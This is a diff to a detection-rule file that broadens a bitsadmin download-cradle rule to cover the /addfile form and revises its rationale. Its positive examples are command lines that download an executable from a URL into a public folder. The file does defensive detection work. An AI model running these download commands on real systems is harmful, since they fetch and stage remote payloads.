@@ -451,9 +451,9 @@
       - 'certutil -dump C:\certs\server.cer'
 
 - id: mention.cradle_bitsadmin_transfer
-  title: bitsadmin transfer from a URL
+  title: bitsadmin /transfer or /addfile text with a URL
   match:
-    anchored: 'bitsadmin(?:\.exe)?["'']?[^\n]{0,40}[/-]transfer [^\n]{0,200}(?:https?|ftp)://'
+    anchored: 'bitsadmin(?:\.exe)?["'']?[^\n]{0,40}[/-](?:transfer|addfile) [^\n]{0,200}(?:https?|ftp)://'
   case_sensitive: false
   strength: medium
   attack: [T1197, T1105]
@@ -464,11 +464,13 @@
     license: DRL-1.1
     upstream_id: d059842b-6b9d-4ed1-b5c3-5b89143c6ede
   rationale: >-
-    The deprecated bitsadmin CLI downloading from a URL is a classic signed-binary download path. The rule notes that
-    some legitimate apps use it, so it is medium.
+    The deprecated bitsadmin CLI downloading from a URL is a classic signed-binary download path; the rule covers both
+    the one-shot /transfer form and the /create plus /addfile job form. The rule notes that some legitimate apps use
+    it, so it is medium.
   examples:
     positive:
       - 'bitsadmin /transfer job1 /download /priority high http://203.0.113.7/a.exe C:\Users\Public\a.exe'
+      - 'bitsadmin.exe /addfile AtomicBITS http://203.0.113.7/a.exe C:\Users\Public\a.exe'
     negative:
       - 'bitsadmin /list /allusers'
       - 'bitsadmin /info job1 /verbose'
